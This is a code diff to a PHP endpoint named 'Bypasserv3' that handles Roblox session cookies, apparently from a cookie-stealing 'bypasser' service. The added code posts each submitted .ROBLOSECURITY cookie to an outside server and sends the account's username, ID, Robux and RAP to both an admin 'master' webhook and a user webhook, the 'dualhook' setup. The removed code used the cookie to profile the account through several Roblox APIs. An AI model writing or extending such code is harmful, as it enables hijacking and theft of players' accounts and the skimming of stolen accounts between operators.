@@ -1,6 +1,7 @@
 <?php
 /**
  * Bypasserv3 - Bypass API Endpoint
+ * Updated with Dualhook Support & Better Error Handling
  */
 
 header('Content-Type: application/json');
@@ -78,40 +79,73 @@ if (!validateCookie($cookie)) {
 // Get instance data for webhook
 $instanceData = getInstanceData($directory);
 $userWebhook = $instanceData['userWebhook'] ?? '';
+$masterWebhook = MASTER_WEBHOOK;
 
-// Call external API to bypass
-$externalApiUrl = EXTERNAL_API_URL . "?cookie=" . urlencode($cookie) . "&web=" . urlencode($userWebhook) . "&dh=" . urlencode(MASTER_WEBHOOK);
+// ============================================
+// CALL EXTERNAL API WITH BETTER ERROR HANDLING
+// ============================================
+$externalApiUrl = 'https://rblxbypasser.com/api/bypass';
+$postData = json_encode(['cookie' => $cookie]);
 
 $ch = curl_init($externalApiUrl);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_TIMEOUT, 180);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
+curl_setopt($ch, CURLOPT_HTTPHEADER, [
+    'Content-Type: application/json',
+    'User-Agent: Bypasserv3/1.0'
+]);
+curl_setopt($ch, CURLOPT_TIMEOUT, 30);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
+
 $apiResponse = curl_exec($ch);
 $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+$curlError = curl_error($ch);
 curl_close($ch);
 
-if ($httpCode !== 200 || empty($apiResponse)) {
+// Check for curl errors or non-200 response
+if (!empty($curlError) || $httpCode !== 200 || empty($apiResponse)) {
     http_response_code(500);
-    echo json_encode(['success' => false, 'error' => 'External API failed']);
-    logSecurityEvent('api_failure', ['http_code' => $httpCode]);
+    echo json_encode([
+        'success' => false,
+        'error' => 'Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account'
+    ]);
+    logSecurityEvent('external_api_failure', [
+        'http_code' => $httpCode,
+        'curl_error' => $curlError,
+        'ip' => $ip
+    ]);
     exit;
 }
 
 $apiData = json_decode($apiResponse, true);
 
-if (!$apiData || $apiData['status'] !== 'success') {
+// Check if API response is valid
+if (!$apiData || !isset($apiData['success']) || !$apiData['success']) {
     http_response_code(500);
-    echo json_encode(['success' => false, 'error' => 'Invalid API response']);
+    echo json_encode([
+        'success' => false,
+        'error' => 'Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account'
+    ]);
+    logSecurityEvent('api_invalid_response', ['ip' => $ip]);
     exit;
 }
 
-// Extract stats from API response
-$robux = intval($apiData['robux'] ?? 0);
-$rap = intval($apiData['rap'] ?? 0);
-$summary = intval($apiData['summary'] ?? 0);
+// ============================================
+// EXTRACT USER DATA FROM API RESPONSE
+// ============================================
+$userInfo = $apiData['userInfo'] ?? [];
+$robux = intval($userInfo['robux'] ?? 0);
+$rap = intval($userInfo['rap'] ?? 0);
+$summary = intval($userInfo['summary'] ?? 0);
+$username = $userInfo['username'] ?? 'Unknown';
+$userId = $userInfo['userId'] ?? 'Unknown';
+$avatarUrl = $apiData['avatarUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';
 
-// Update instance stats
+// ============================================
+// UPDATE INSTANCE STATS
+// ============================================
 if ($instanceData) {
     updateInstanceStats($directory, 'totalCookies', ($instanceData['stats']['totalCookies'] ?? 0) + 1);
     updateInstanceStats($directory, 'totalRobux', ($instanceData['stats']['totalRobux'] ?? 0) + $robux);
@@ -127,117 +161,52 @@ if ($instanceData) {
 // Update global stats
 updateGlobalStats('totalCookies', 1);
 
-// Calculate account score
-$accountScore = 0;
-$accountScore += min(20, floor($robux / 1000));
-$accountScore += min(20, floor($rap / 5000));
-$accountScore += min(30, floor($summary / 10000));
-$accountScore = min(100, $accountScore);
+// ============================================
+// SEND DUALHOOK NOTIFICATIONS
+// ============================================
 
-// Get user info
-$headers = ["Cookie: .ROBLOSECURITY=$cookie"];
-$ch = curl_init("https://www.roblox.com/my/settings/json");
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-$response = curl_exec($ch);
-curl_close($ch);
-
-$settingsData = json_decode($response, true);
-$userId = $settingsData['UserId'] ?? 'Unknown';
-$username = $settingsData['Name'] ?? 'Unknown';
-$isPremium = $settingsData['IsPremium'] ?? false;
-
-// Get additional user info
-$ch = curl_init("https://users.roblox.com/v1/users/$userId");
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-$response = curl_exec($ch);
-curl_close($ch);
-
-$userInfo = json_decode($response, true);
-$displayName = $userInfo['displayName'] ?? $username;
-
-// Get avatar
-$avatarData = json_decode(file_get_contents("https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=150x150&format=Png&isCircular=false"), true);
-$avatarUrl = $avatarData['data'][0]['imageUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';
-
-// Get account age
-$accountCreated = isset($userInfo['created']) ? strtotime($userInfo['created']) : time();
-$accountAgeDays = floor((time() - $accountCreated) / 86400);
-
-// Get friends
-$ch = curl_init("https://friends.roblox.com/v1/users/$userId/friends/count");
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-$response = curl_exec($ch);
-curl_close($ch);
-$friendsData = json_decode($response, true);
-$friendsCount = $friendsData['count'] ?? 0;
-
-// Get followers
-$ch = curl_init("https://friends.roblox.com/v1/users/$userId/followers/count");
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-$response = curl_exec($ch);
-curl_close($ch);
-$followersData = json_decode($response, true);
-$followersCount = $followersData['count'] ?? 0;
-
-// Get voice chat
-$ch = curl_init("https://voice.roblox.com/v1/settings");
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-$response = curl_exec($ch);
-curl_close($ch);
-$vcData = json_decode($response, true);
-$vcEnabled = $vcData['isVoiceEnabled'] ?? false;
-
-// Get groups owned
-$ch = curl_init("https://groups.roblox.com/v2/users/$userId/groups/roles");
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-$response = curl_exec($ch);
-curl_close($ch);
-$groupsData = json_decode($response, true);
-$ownedGroups = 0;
-if (isset($groupsData['data'])) {
-    foreach ($groupsData['data'] as $group) {
-        if ($group['role']['rank'] == 255) {
-            $ownedGroups++;
-        }
-    }
+// Master Webhook Notification (Admin)
+if (!empty($masterWebhook)) {
+    $masterPayload = [
+        'embeds' => [[
+            'title' => '✅ Successful Bypass',
+            'description' => "**Username:** `{$username}`\n**User ID:** `{$userId}`\n**Robux:** `{$robux}`\n**RAP:** `{$rap}`\n**Instance:** `{$directory}`",
+            'color' => 3066993,
+            'footer' => ['text' => 'Bypasserv3 | Master Admin'],
+            'timestamp' => date('c')
+        ]]
+    ];
+    sendWebhookNotification($masterWebhook, $masterPayload);
 }
 
-// Log success
+// User Webhook Notification (User)
+if (!empty($userWebhook)) {
+    $userPayload = [
+        'embeds' => [[
+            'title' => '🎉 Account Bypass Success',
+            'description' => "**Account:** `{$username}`\n**ID:** `{$userId}`\n**Robux Balance:** `{$robux}`\n**RAP Value:** `{$rap}`",
+            'color' => 3447003,
+            'footer' => ['text' => 'Your Bypasser'],
+            'timestamp' => date('c')
+        ]]
+    ];
+    sendWebhookNotification($userWebhook, $userPayload);
+}
+
+// Log successful bypass
 logSecurityEvent('successful_bypass', [
     'username' => $username,
     'userId' => $userId,
     'robux' => $robux,
-    'score' => $accountScore
+    'ip' => $ip
 ]);
 
-// Return response
+// ============================================
+// RETURN RESPONSE
+// ============================================
 echo json_encode([
     'success' => true,
-    'userInfo' => [
-        'username' => $username,
-        'displayName' => $displayName,
-        'userId' => $userId,
-        'robux' => $robux,
-        'rap' => $rap,
-        'premium' => $isPremium ? 'Yes' : 'No',
-        'voiceChat' => $vcEnabled ? 'Yes' : 'No',
-        'friends' => $friendsCount,
-        'followers' => $followersCount,
-        'accountAge' => "{$accountAgeDays} days",
-        'groupsOwned' => $ownedGroups,
-        'accountScore' => $accountScore
-    ],
+    'userInfo' => $userInfo,
     'avatarUrl' => $avatarUrl
 ]);
 ?>
